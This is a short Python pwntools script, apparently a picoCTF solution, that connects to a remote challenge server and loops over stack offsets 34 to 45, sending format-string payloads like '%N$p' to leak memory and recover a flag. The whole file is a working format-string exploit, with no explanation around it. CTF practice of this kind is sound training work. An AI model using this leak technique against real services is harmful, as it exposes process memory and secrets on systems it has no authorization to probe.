#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("vuln")


# input differnt places to find full flag
for i in range(34, 46):
    io = remote("saturn.picoctf.net", 54552)
    payload = "%{}$p,".format(i).encode()
    log.info("Payload: %s", payload)
    io.sendlineafter(b"Tell me a story and then I'll tell you one >> ", payload)
    print(io.recv())
    sleep(1)
